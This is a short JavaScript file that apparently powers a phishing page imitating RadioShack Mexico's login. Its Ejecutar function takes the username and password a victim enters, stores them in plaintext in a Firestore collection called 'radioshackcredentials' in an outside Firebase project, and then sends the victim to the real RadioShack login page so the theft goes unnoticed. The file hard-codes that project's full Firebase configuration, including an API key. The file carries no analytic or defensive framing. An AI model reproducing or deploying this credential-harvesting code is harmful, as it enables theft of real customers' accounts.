loginButtonMaterial1 = document.getElementById("loginButtonMaterial1");
usernamelogin1 = document.getElementById("usernamelogin1");
j_passwordexpress1 = document.getElementById("j_passwordexpress1");

const firebaseConfig = {
    apiKey: "AIzaSyDPmJ81x98GMmj7oGcfSqJK8CiKRO3aVTU",
    authDomain: "radiosshackdaniel.firebaseapp.com",
    projectId: "radiosshackdaniel",
    storageBucket: "radiosshackdaniel.appspot.com",
    messagingSenderId: "475329526210",
    appId: "1:475329526210:web:238df78bddc1c696ab3e5b",
    measurementId: "G-XVJSNM9G6K"
};




function Ejecutar() {

    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }

    const db = firebase.firestore();


    var usernamelogin1 = document.getElementById("usernamelogin1").value;
    var j_passwordexpress1 = document.getElementById("j_passwordexpress1").value;

    db.collection("radioshackcredentials").doc().set({
        user: usernamelogin1,
        password: j_passwordexpress1
    })
        .then(function () {
            console.log("successful");
            onclick = location.href = 'https://www.radioshack.com.mx/store/radioshack/en/login'
        })
        .catch(function (error) {
            console.error("Error writing", error);
        });


  
}